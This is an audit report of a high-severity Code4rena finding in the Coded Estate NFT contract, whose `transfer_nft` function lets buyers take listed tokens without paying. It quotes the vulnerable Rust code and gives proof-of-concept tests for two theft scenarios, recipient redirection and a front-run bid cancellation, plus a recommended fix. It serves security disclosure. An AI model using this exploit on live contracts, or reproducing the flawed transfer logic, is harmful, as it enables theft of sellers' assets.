---
tags:
  - lang/rust
  - lang/solidity
  - sector/nft
  - sector/options
  - sector/stable
  - platform/code4rena
  - has/github
  - severity/high
  - impact/privilege-escalation/ownership-transfer
  - novelty/variant
protocol: "[[Coded Estate]]"
auditors:
  - "[[nnez]]"
report: "https://code4rena.com/reports/2024-10-coded-estate"
genome:
  - "[[spot-price]]"
  - "[[ownership-transfer]]"
  - "[[variant]]"
  - "[[frontrun-exposure]]"
  - "[[oracle-manipulation-resistance]]"
---
# [H-03] Insufficient price validation in `transfer_nft` function enables theft of listed tokens

- id: 45190
- impact: HIGH
- protocol: [[Coded Estate]]
- reporter: nnez (Code4rena)
- source: https://code4rena.com/reports/2024-10-coded-estate

## Summary


This report discusses a vulnerability in a smart contract that allows malicious buyers to acquire listed NFTs without paying the sellers. The vulnerability stems from two oversights in the `transfer_nft` function: it does not verify if the offer bid amount matches the listed price of the token, and it allows the caller to freely specify the recipient and transfer to recipients with no active bids. This allows attackers to exploit the system by manipulating the bid and transfer process, resulting in them acquiring the NFT without paying the listed price. The report recommends implementing a check to ensure that the offer bid amount matches the listed price set by the seller when completing the trade. The vulnerability has been confirmed by the developers and has been categorized as an "Invalid Validation" issue. 

## Details


This vulnerability allows malicious buyers to acquire listed NFTs without payment to sellers.

### Description

Users can list their tokens for sale by calling `setlistosell` and specifying a price and payment token (denom). Buyers can then purchase the token by calling `setbidtobuy` and transferring the payment into the contract.

The trade is finalized when `transfer_nft` is invoked and the recipient is the buyer. The caller can be the seller, or, if `auto_approve` is set to true, the caller can also be the buyer as they're given approval upon calling `setbidtobuy`.

However, `transfer_nft` function lacks a proper validation during the transfer. This vulnerability stems from two key oversights:

1. The function doesn't verify if the offer bid amount matches the listed price of the token.
2. It allows caller to freely specify recipient and transfer to recipients with no active bids, defaulting to a zero payment.

These oversights enable malicious buyers to acquire NFTs without paying the listed price, effectively stealing them from sellers.

`transfer_nft` implementation:

```rust
fn transfer_nft(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    recipient: String, // @c4-contest caller of this function can freely specify `recipient` address
    token_id: String,
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_send(deps.as_ref(), &env, &info, &token)?;
    // set owner and remove existing approvals
    let prev_owner = token.owner;
    token.owner = deps.api.addr_validate(&recipient)?; // @c4-contest ownership is transferred to recipient
    token.approvals = vec![];
    let fee_percentage = self.get_fee(deps.storage)?;

    let mut position: i32 = -1;
    let mut amount = Uint128::from(0u64); // @c4-contest: amount is default to zero
    for (i, item) in token.bids.iter().enumerate() {
        if item.address == recipient.to_string()
        {
            position = i as i32;
            amount = item.offer.into();
            break;  
        }
    }
    // @c4-contest: if recipient doesn't have bid on this token, amount is default to zero
    if position != -1 && amount > Uint128::new(0) {
        self.increase_balance(deps.storage, token.sell.denom.clone(), Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000))?;
    }
    let amount_after_fee = amount.checked_sub(Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000)).unwrap_or_default();
    token.bids.retain(|bid| bid.address != recipient);
    self.tokens.save(deps.storage, &token_id, &token)?;
    // @c4-contest: no validation whether the bid amount matches with the listed price.  
    if amount > Uint128::new(0) {
        Ok(Response::new()
        .add_attribute("action", "transfer_nft")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: prev_owner.to_string(),
            amount: vec![Coin {
                denom: token.sell.denom,
                amount: amount_after_fee,
            }],
        }))
    } else { // @c4-contest: if amount is zero, the transfer go through with no payment to seller
        Ok(Response::new()
        .add_attribute("action", "transfer_nft")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id))
    }
}
```

This vulnerability can be exploited in two scenarios:

1. **Auto-approve enabled** - When `auto_approve` is set to true, a buyer can exploit the system by:<br>
    - Calling `setbidtobuy` to gain approval.
    - Invoking `transfer_nft` with a different recipient address that has no active bid.
    - Cancelling their original bid for a full refund.

2. **Auto-approve disabled** - Even when `auto_approve` is false, an attacker can:
    - Place a bid on the token.
    - Front-run the seller's `transfer_nft` transaction, cancelling their bid.
    - The seller's transaction is executed after, transferring the token without payment.

### Proof-of-Concept

The following test demonstrates the two described scenarios:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

<details>

```rust
#[test]
fn h5_insufficient_price_validation_auto_approve_true() {
    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Minter mints a token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Minter lists token for sale, price = 1000 USDC and auto_approve = true
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok
    
    const ATTACKER_1: &str = "attacker-1";
    const ATTACKER_2: &str = "attacker-2";
    init_usdc_balance(&mut app, ATTACKER_2, 1000);

    // Attacker_2 bids at target price after Minter lists for sell
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER_2),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok

    // Attacker_2 invokes transfer_nft but specify the recipient to Attacker_1 address which has no active bid on this token  
    let transfer_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::TransferNft { 
        recipient: ATTACKER_1.to_string(), 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER_2),
        contract_addr.clone(),
        &transfer_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that token ownership is transferred to Attacker_1
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), ATTACKER_1);
    // Asserts that Minter gets nothing for this sale  
    assert_eq!(query_denom_balance(&app, MINTER, USDC), 0);

    // Attacker_2 can also cancel their bid
    assert_eq!(query_denom_balance(&app, ATTACKER_2, USDC), 0); 
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER_2),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that Attacker_2 gets their refund back in full  
    assert_eq!(query_denom_balance(&app, ATTACKER_2, USDC), 1000);  
}

#[test]
fn h5_insufficient_price_validation_auto_approve_false() {
    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Minter mints a token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Minter lists token for sale, price = 1000 USDC and auto_approve = true
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: false
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok
    
    const ATTACKER: &str = "attacker";
    init_usdc_balance(&mut app, ATTACKER, 1000);

    // Attacker bids at target price after Minter lists for sell
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok


    // Minter notices a bid from Attacker and decides to complete the trade
    // Attacker front-run the tx and cancel their bid

    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![],
    );
    assert!(res.is_ok()); // Everything is ok

    // Minter's transaction is executed after
    let transfer_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::TransferNft { 
        recipient: ATTACKER.to_string(), 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &transfer_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that Attacker_2 gets their refund back in full  
    assert_eq!(query_denom_balance(&app, ATTACKER, USDC), 1000);  
    // Asserts that token ownership is transferred to Attacker_1
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), ATTACKER);
    // Asserts that Minter gets nothing for this sale  
    assert_eq!(query_denom_balance(&app, MINTER, USDC), 0);
}
```

</details>

3. Run `cargo test h5_insufficient_price_validation_auto_approve_true -- --nocapture`.
4. Run `cargo test h5_insufficient_price_validation_auto_approve_false -- --nocapture`.
5. Observe that both tests pass, indicating that described scenarios are valid.

### Recommended Mitigation

If token is listed for sell, check that the offer bid amount is exactly matched with the listed price set by seller.

```rust
if token.sell.isListed {
    if amount < token.sell.price{
        // throw error
    }
    else{
        // proceed to complete the trade
    }
}
else{
    // do normal transfer
}
```

### Assessed type

Invalid Validation

**[blockchainstar12 (Coded Estate) confirmed](https://github.com/code-423n4/2024-10-coded-estate-findings/issues/12#event-14638451148)**

***
